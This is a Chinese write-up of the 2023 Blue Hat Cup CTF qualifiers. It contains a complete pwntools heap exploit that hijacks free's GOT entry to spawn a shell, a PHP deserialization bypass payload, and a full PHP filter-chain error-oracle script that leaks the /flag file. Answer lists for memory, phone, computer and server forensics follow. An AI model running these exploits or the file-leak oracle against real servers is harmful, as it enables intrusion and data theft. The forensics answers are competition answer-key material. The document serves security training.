---
title: '2023 第七届蓝帽杯初赛 Writeup'
description: '1.进入查看源码，是个反序列化：'
pubDate: 2023-08-26
author: 'IHK-1'
tags: ['CTF', '蓝帽杯', '初赛', '2023']
---

# PWN
```plain
from pwn import *
binary = "./takeway"
elf = ELF(binary)
libc = elf.libc
ip = '101.200.234.115'
port = 43184
local = 1
if local:
    io = process(binary)
else:
    io = remote(ip, port)

#context.log_level = "debug"

def dbg(cmd = ""):
    if cmd == "":
        gdb.attach(io)
        pause()
    else:
        gdb.attach(io, cmd)
        pause()

s = lambda data : io.send(data)
sl = lambda data : io.sendline(data)
sa = lambda text, data : io.sendafter(text, data)
sla = lambda text, data : io.sendlineafter(text, data)
r = lambda : io.recv()
ru = lambda text : io.recvuntil(text)
uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda data : io.success('%s -> 0x%x' % (data, eval(data)))
ia = lambda : io.interactive()
_flags = 0xfbad1800

def menu(n):
    sla(b"Please input your choose: ", str(n).encode())

def add(idx, name = b"/bin/sh\x00", remark = b"/bin/sh\x00"):
    menu(1)
    sla(b"Please input your order index", str(idx).encode())
    sa(b"Please input your food name: ", name)
    sa(b"remark: ", remark)

def delete(idx):
    menu(2)
    sla(b"Please input your order index: ", str(idx).encode())

def edit(idx, name):
    menu(3)
    sla(b"Please input index: ", str(idx).encode())
    sa(b"New food name is: ", name)

'''add(0)
add(1)
delete(0)
delete(1)
edit(1, p64(elf.got['free'] - 0x8))
add(2)
add(4, p64(elf.plt['puts']), p64(elf.plt['puts']))
delete(3)'''
add(0)
add(1)
add(2)
delete(0)
delete(1)
edit(1, p64(0x404088 - 8))
add(3)
add(4, p64(0), p64(0x20))

delete(0)
delete(1)
edit(1, p64(0x404030 - 8))
add(7)

add(8, b"\x00", b"a" * 8)
menu(3)
sla(b"Please input index: ", str(8).encode())
libcbase = uu64() - 0x8bad0
lg("libcbase")

system = libcbase + libc.sym['system']
sa(b"New food name is: ", p64(system))

delete(1)
delete(2)
edit(2, p64(elf.got['free'] - 8))
add(9)
add(10, p64(0), p64(system))
delete(9)
ia()
```

# WEB
## 

1.进入查看源码，是个反序列化：

![](https://raw.githubusercontent.com/guangjiovo/picgo/main/202308262213658.png)

2.这里需要绕过两个地方，第一是传参`my_secret.flag`的的下划线，因为下划线会被解析为空格，所以这里直接用中括号替换即可：`my[secret.flag`。第二个地方是`__wakeup`魔术方法，这里由于默认给了`true`，可以利用另一个特性绕过：自定义对象C。当序列化使用了自定义对象C时，`Serializable`回因为不支持`__wakeup`方法，从而使其无效，故我们只需要使用：`?my[secret.flag=C:8:"Saferman":0:{}`即可绕过。

3.进入到`file()`函数，官方文档描述为：**PHP file() 函数把整个文件读入一个数组中。与 file_get_contents() 类似，不同的是 file() 将文件作为一个数组返回。**这里和`file_get_contents`类似的话，意味着应该也存在文件包含，可以使用PHP流过滤器。但是由于没有输出，所以是无回显的。

4.谷歌发现原题：[ DownUnder CTF 2022](https://tttang.com/archive/1755/#toc_tldr)。文章描述的原理，大概意思就是用几个php的过滤器来实现测信道攻击，通过字符逐位翻转和不在范围的回显情况来判断并读取出文件流中的内容。并且在最后集成了一个FUZZ的exp脚本：https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py。

5.利用脚本替换好攻击url和bypass参数位置，运行即可逐位判断读取到`/flag`文件的内容：

```python
import requests
import sys
from base64 import b64decode

"""
THE GRAND IDEA:
We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE
filter will blow up the string length by 4x every time it is used, which will quickly cause
500 error if and only if the string is non empty. So we now have an oracle that tells us if
the string is empty.

THE GRAND IDEA 2:
The dechunk filter is interesting.
https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724
It looks like it was implemented for something http related, but for our purposes, the interesting
behavior is that if the string contains no newlines, it will wipe the entire string if and only if
the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our
above oracle! In fact we can verify that since the flag starts with D that the filter chain

dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE

does not cause a 500 error.

THE REST:
So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent
into madness trying to figure out ways to:
- somehow get other characters not at the start of the flag file to the front
- detect more precisely which character is at the front
"""

def join(*x):
	return '|'.join(x)

def err(s):
	print(s)
	raise ValueError

def req(s):
    # 注意，这里的方式要为get
	return requests.get('http://you_url:port/index.php?my[secret.flag=C:8:"Saferman":0:{}&secret=' + f'php://filter/{s}/resource=/flag).status_code == 500

"""
Step 1:
The second step of our exploit only works under two conditions:
- String only contains a-zA-Z0-9
- String ends with two equals signs

base64-encoding the flag file twice takes care of the first condition.

We don't know the length of the flag file, so we can't be sure that it will end with two equals
signs.

Repeated application of the convert.quoted-printable-encode will only consume additional
memory if the base64 ends with equals signs, so that's what we are going to use as an oracle here.
If the double-base64 does not end with two equals signs, we will add junk data to the start of the
flag with convert.iconv..CSISO2022KR until it does.
"""

blow_up_enc = join(*['convert.quoted-printable-encode']*1000)
blow_up_utf32 = 'convert.iconv.L1.UCS-4LE'
blow_up_inf = join(*[blow_up_utf32]*50)

header = 'convert.base64-encode|convert.base64-encode'

# Start get baseline blowup
print('Calculating blowup')
baseline_blowup = 0
for n in range(100):
	payload = join(*[blow_up_utf32]*n)
	if req(f'{header}|{payload}'):
		baseline_blowup = n
		break
else:
	err('something wrong')

print(f'baseline blowup is {baseline_blowup}')

trailer = join(*[blow_up_utf32]*(baseline_blowup-1))

assert req(f'{header}|{trailer}') == False

print('detecting equals')
j = [
	req(f'convert.base64-encode|convert.base64-encode|{blow_up_enc}|{trailer}'),
	req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode{blow_up_enc}|{trailer}'),
	req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|{blow_up_enc}|{trailer}')
]
print(j)
if sum(j) != 2:
	err('something wrong')
if j[0] == False:
	header = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode'
elif j[1] == False:
	header = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode'
elif j[2] == False:
	header = f'convert.base64-encode|convert.base64-encode'
else:
	err('something wrong')
print(f'j: {j}')
print(f'header: {header}')

"""
Step two:
Now we have something of the form
[a-zA-Z0-9 things]==

Here the pain begins. For a long time I was trying to find something that would allow me to strip
successive characters from the start of the string to access every character. Maybe something like
that exists but I couldn't find it. However, if you play around with filter combinations you notice
there are filters that *swap* characters:

convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:
abcdefgh -> badcfehg

convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:
abcdefgh -> dcbahgfe

This allows us to access the first four characters of the string. Can we do better? It turns out
YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends <0xff><0xfe> to the start of
the string:

abcdefgh -> <0xff><0xfe>abcdefgh

The idea being that if we now use the r4 gadget, we get something like:
ba<0xfe><0xff>fedc

And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid
<0xfe><0xff> to get:
bafedc

And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th
characters of the string. There's only one problem: our r4 gadget requires that the string length
is a multiple of 4. The original base64 string will be a multiple of four by definition, so when
we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no
good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it
turns out, if we apply the filter
convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7

It will turn the == into:
+---AD0-3D3D+---AD0-3D3D

And this is magic, because this corrects such that when we apply the
convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!

Let's recap. We have a string like:
abcdefghij==

Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:
abcdefghij+---AD0-3D3D+---AD0-3D3D

Apply convert.iconv.CSUNICODE.CSUNICODE:
<0xff><0xfe>abcdefghij+---AD0-3D3D+---AD0-3D3D

Apply r4 gadget:
ba<0xfe><0xff>fedcjihg---+-0DAD3D3---+-0DAD3D3

Apply base64-decode | base64-encode, so the '-' and high bytes will disappear:
bafedcjihg+0DAD3D3+0DAD3Dw==

Then apply r4 once more:
efabijcd0+gh3DAD0+3D3DAD==wD

And here's the cute part: not only have we now accessed the 5th and 6th chars of the string, but
the string still has two equals signs in it, so we can reapply the technique as many times as we
want, to access all the characters in the string ;)
"""

flip = "convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode"
r2 = "convert.iconv.CSUNICODE.UCS-2BE"
r4 = "convert.iconv.UCS-4LE.10646-1:1993"

def get_nth(n):
	global flip, r2, r4
	o = []
	chunk = n // 2
	if chunk % 2 == 1: o.append(r4)
	o.extend([flip, r4] * (chunk // 2))
	if (n % 2 == 1) ^ (chunk % 2 == 1): o.append(r2)
	return join(*o)

"""
Step 3:
This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first
char is 0-9A-Fa-f. So it's just a matter of finding filters which translate to or from those
chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but
I just bruteforced every combination of iconv filters to find these.

Numbers are a bit trickier because iconv doesn't tend to touch them.
In the CTF you coud porbably just guess from there once you have the letters. But if you actually 
want a full leak you can base64 encode a third time and use the first two letters of the resulting
string to figure out which number it is.
"""

rot1 = 'convert.iconv.437.CP930'
be = 'convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode'
o = ''

def find_letter(prefix):
	if not req(f'{prefix}|dechunk|{blow_up_inf}'):
		# a-f A-F 0-9
		if not req(f'{prefix}|{rot1}|dechunk|{blow_up_inf}'):
			# a-e
			for n in range(5):
				if req(f'{prefix}|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
					return 'edcba'[n]
					break
			else:
				err('something wrong')
		elif not req(f'{prefix}|string.tolower|{rot1}|dechunk|{blow_up_inf}'):
			# A-E
			for n in range(5):
				if req(f'{prefix}|string.tolower|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
					return 'EDCBA'[n]
					break
			else:
				err('something wrong')
		elif not req(f'{prefix}|convert.iconv.CSISO5427CYRILLIC.855|dechunk|{blow_up_inf}'):
			return '*'
		elif not req(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
			# f
			return 'f'
		elif not req(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
			# F
			return 'F'
		else:
			err('something wrong')
	elif not req(f'{prefix}|string.rot13|dechunk|{blow_up_inf}'):
		# n-s N-S
		if not req(f'{prefix}|string.rot13|{rot1}|dechunk|{blow_up_inf}'):
			# n-r
			for n in range(5):
				if req(f'{prefix}|string.rot13|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
					return 'rqpon'[n]
					break
			else:
				err('something wrong')
		elif not req(f'{prefix}|string.rot13|string.tolower|{rot1}|dechunk|{blow_up_inf}'):
			# N-R
			for n in range(5):
				if req(f'{prefix}|string.rot13|string.tolower|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):
					return 'RQPON'[n]
					break
			else:
				err('something wrong')
		elif not req(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
			# s
			return 's'
		elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
			# S
			return 'S'
		else:
			err('something wrong')
	elif not req(f'{prefix}|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
		# i j k
		if req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'k'
		elif req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'j'
		elif req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'i'
		else:
			err('something wrong')
	elif not req(f'{prefix}|string.tolower|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
		# I J K
		if req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'K'
		elif req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'J'
		elif req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'I'
		else:
			err('something wrong')
	elif not req(f'{prefix}|string.rot13|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
		# v w x
		if req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'x'
		elif req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'w'
		elif req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'v'
		else:
			err('something wrong')
	elif not req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|dechunk|{blow_up_inf}'):
		# V W X
		if req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'X'
		elif req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'W'
		elif req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):
			return 'V'
		else:
			err('something wrong')
	elif not req(f'{prefix}|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
		# Z
		return 'Z'
	elif not req(f'{prefix}|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
		# z
		return 'z'
	elif not req(f'{prefix}|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
		# M
		return 'M'
	elif not req(f'{prefix}|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):
		# m
		return 'm'
	elif not req(f'{prefix}|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
		# y
		return 'y'
	elif not req(f'{prefix}|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
		# Y
		return 'Y'
	elif not req(f'{prefix}|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
		# l
		return 'l'
	elif not req(f'{prefix}|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):
		# L
		return 'L'
	elif not req(f'{prefix}|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
		# h
		return 'h'
	elif not req(f'{prefix}|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
		# H
		return 'H'
	elif not req(f'{prefix}|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
		# u
		return 'u'
	elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):
		# U
		return 'U'
	elif not req(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
		# g
		return 'g'
	elif not req(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
		# G
		return 'G'
	elif not req(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
		# t
		return 't'
	elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):
		# T
		return 'T'
	else:
		err('something wrong')

print()
for i in range(100):
	prefix = f'{header}|{get_nth(i)}'
	letter = find_letter(prefix)
	# it's a number! check base64
	if letter == '*':
		prefix = f'{header}|{get_nth(i)}|convert.base64-encode'
		s = find_letter(prefix)
		if s == 'M':
			# 0 - 3
			prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'
			ss = find_letter(prefix)
			if ss in 'CDEFGH':
				letter = '0'
			elif ss in 'STUVWX':
				letter = '1'
			elif ss in 'ijklmn':
				letter = '2'
			elif ss in 'yz*':
				letter = '3'
			else:
				err(f'bad num ({ss})')
		elif s == 'N':
			# 4 - 7
			prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'
			ss = find_letter(prefix)
			if ss in 'CDEFGH':
				letter = '4'
			elif ss in 'STUVWX':
				letter = '5'
			elif ss in 'ijklmn':
				letter = '6'
			elif ss in 'yz*':
				letter = '7'
			else:
				err(f'bad num ({ss})')
		elif s == 'O':
			# 8 - 9
			prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'
			ss = find_letter(prefix)
			if ss in 'CDEFGH':
				letter = '8'
			elif ss in 'STUVWX':
				letter = '9'
			else:
				err(f'bad num ({ss})')
		else:
			err('wtf')

	print(end=letter)
	o += letter
	sys.stdout.flush()

"""
We are done!! :)
"""

print()
d = b64decode(o.encode() + b'=' * 4)
# remove KR padding
d = d.replace(b'$)C',b'')
print(b64decode(d))
```

![](https://raw.githubusercontent.com/guangjiovo/picgo/main/202308262352310.png)

# Reverse
出题人给的源码忘记删代码了，直接把需要输入的答案即flag放到源码的注释里了

# MISC
```plain
PS C:\Users\HK\Desktop\取证\volatility\VolatilityWorkbench2.6> C:\Users\HK\Desktop\取证\volatility\VolatilityWorkbench2.6\volatility.exe -f C:\Users\HK\Desktop\mem.raw --profile=Win7SP1x64 filescan > ./out.txt
```

但是readme.txt不能明文出压缩包，editbox查看历史

```plain
U2FsdGVkX19dHyROKCNrT5BAJk9asDpaZ8L45vr9s9D2Yi9/OX5Xl6lEmhd0VoietsmeiLHJjPPG0uSsdxGgr2jzQ00FEMf/VglaSrhwumM=
```

但是解出的密钥无法写出压缩包，尝试重置密码

解压修改table后缀为文件

对应 key 的鼠标轨迹解出  a91e37bf

在线网站解密出答案 

part2: 3a-f140-2626195942a0} the other part is in the password

前半部分在password里，尝试

  flag{194a019a-1767-913a-f140-2626195942a0}

# 取证
## 手机取证

```plain
【APK取证】涉案apk的包名是？[答题格式:com.baid.ccs]
com.vestas.app

【APK取证】涉案apk的签名序列号是？[答题格式:0x93829bd]
0x563b45ca

【APK取证】涉案apk的服务器域名是？[答题格式:http://sles.vips.com]
https://vip.licai.com

【APK取证】涉案apk的主入口是？[答题格式:com.bai.cc.initactivity]
io.dcloud.PandoraEntry
```

## 手机取证
```plain
【手机取证】该镜像是用的什么模拟器？[答题格式:天天模拟器]
雷电模拟器
```

雷电模拟器还原镜像

```plain
【手机取证】该镜像中用的聊天软件名称是什么？[答题格式:微信]
与你
```

```plain
【手机取证】聊天软件的包名是？[答题格式:com.baidu.ces]
com.uneed.yuni
```

```plain
【手机取证】投资理财产品中，受害人最后投资的产品最低要求投资多少钱？[答题格式:1万]
5万
```

```plain
【手机取证】受害人是经过谁介绍认识王哥？[答题格式:董慧]
华哥
```

## 计算机取证

```plain
【计算机取证】请给出嫌疑人杨某登录理财网站前台所用账号密码？[答案格式：root/admin]
yang88/3w.qax.com

【计算机取证】请给出嫌疑人Vera Crypt加密容器的解密密码？[答案格式：admin!@#]
3w.qax.com!!@@

veracrypt解密后挂载打开xlsx
【计算机取证】分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？[答案格式：10000]
1019
```

```plain
【计算机取证】请给出计算机镜像pc.e01的SHA-1值？[答案格式：字母小写]
23f861b2e9c5ce9135afc520cbd849677522f54c
```

## 内存取证

```plain
【内存取证】请给出计算机内存创建北京时间？[答案格式：2000-01-11 00:00:00]
2023-06-21 01:02:27
```

```plain
【内存取证】请给出计算机内用户yang88的开机密码？[答案格式：abc.123]
3w.qax.com
```

```plain
【内存取证】请给出“VeraCrypt”最后一次执行的北京时间？[答案格式：2000-01-11 00:00:00]
2023-06-21 00:47:41
```

## 服务器取证

```plain
【服务器取证】分析涉案服务器，请给出涉案网站RDS数据库地址？[答题格式: xx-xx.xx.xx.xx.xx]
pc-uf6mmj68r91f78hkj.rwlb.rds.aliyuncs.com
```

```plain
【服务器取证】请给出涉网网站数据库版本号? [答题格式: 5.6.00]
5.7.40
```

导出WWW挂载拟真服务器，前台

```plain
【服务器取证】投资项目“贵州六盘水市风力发电基建工程”的日化收益为？[答题格式:1.00%]
4.00%
```

